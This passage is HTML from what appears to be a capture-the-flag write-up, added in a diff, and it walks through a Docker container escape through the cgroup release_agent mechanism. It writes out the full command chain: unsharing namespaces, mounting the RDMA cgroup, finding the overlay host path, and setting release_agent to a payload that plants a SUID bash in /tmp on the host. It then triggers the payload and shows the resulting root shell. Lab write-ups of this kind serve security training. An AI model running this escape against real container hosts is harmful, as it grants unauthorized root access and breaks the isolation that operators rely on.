+                <pre><code class="language-bash">unshare -UrmC bash</code></pre>
+
+                <pre><code class="language-bash">capsh --print | grep cap_sys_admin
+<span style="color:#98c379;"># cap_sys_admin now appears in the Bounding set</span></code></pre>
+
+                <p>Mount the RDMA cgroup subsystem:</p>
+
+                <pre><code class="language-bash">mount -t cgroup -o rdma cgroup /mnt</code></pre>
+
+                <pre><code class="language-bash">ls -lah /mnt
+<span style="color:#98c379;"># -rw-r--r-- 1 root root 0  notify_on_release</span>
+<span style="color:#98c379;"># -rw-r--r-- 1 root root 0  release_agent</span></code></pre>
+
+                <p>Create a child cgroup and enable <code>notify_on_release</code>:</p>
+
+                <pre><code class="language-bash">mkdir /mnt/x
+echo 1 &gt; /mnt/x/notify_on_release</code></pre>
+
+                <p>Find the host path that maps to this container's filesystem:</p>
+
+                <pre><code class="language-bash">host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo $host_path
+<span style="color:#98c379;"># /var/lib/docker/overlay2/e4ee513c84a45c4dc61a80642fbbddd4fd2d1145ec759bf4415b642bc17f383b/diff</span></code></pre>
+
+                <p>Point <code>release_agent</code> to a <code>cmd</code> file I'll create in the container root (which
+                    maps to that overlay path on the host):</p>
+
+                <pre><code class="language-bash">echo "$host_path/cmd" &gt; /mnt/release_agent
+cat /mnt/release_agent
+<span style="color:#98c379;"># /var/lib/docker/overlay2/e4ee513c.../diff/cmd</span></code></pre>
+
+                <p>Create the payload: set the SUID bit on a bash copy in <code>/tmp</code> on the host:</p>
+
+                <pre><code class="language-bash">echo -e <span style="color:#98c379;">'#!/bin/bash\n\ncp /bin/bash /tmp/xd && chmod u+s /tmp/xd'</span> &gt; /cmd
+chmod +x /cmd</code></pre>
+
+                <p>Trigger the payload by writing the current PID to <code>cgroup.procs</code>. The process dies
+                    immediately, the kernel detects the empty cgroup, and executes <code>release_agent</code> in the
+                    <strong>host's context</strong>:</p>
+
+                <pre><code class="language-bash">sh -c <span style="color:#98c379;">"echo \$\$ > /mnt/x/cgroup.procs"</span></code></pre>
+
+                <p>The execution flow:</p>
+
+                <pre><code class="language-plaintext">sh -c "echo $$ > cgroup.procs"
+│
+├─ $$ = process's own PID
+│
+├─ writes PID → kernel moves that PID into the cgroup
+│
+└─ sh -c exits → PID dies
+          │
+          kernel: "cgroup is empty, notify_on_release=1"
+          │
+          executes release_agent ON THE HOST (with kernel privileges)</code></pre>
+
+                <p>Back on the host as <code>hflaccus</code>, I verify the SUID bash was created:</p>
+
+                <pre><code class="language-bash">ls -lah /tmp/xd
+<span style="color:#98c379;">-rwsr-xr-x 1 root root 1.2M May 10 14:37 xd</span></code></pre>
+
+                <p>Execute it with the <code>-p</code> flag to preserve the effective UID:</p>
+
+                <pre><code class="language-bash">hflaccus@carpediem:~$ /tmp/xd -p
+xd-5.0# whoami
+root</code></pre>
+
+                <p>Root access on the host achieved.</p>
+            </div>
+
+        </article>
+    </main>
+
+    <script src="../../index.js"></script>
+</body>
+
+</html>
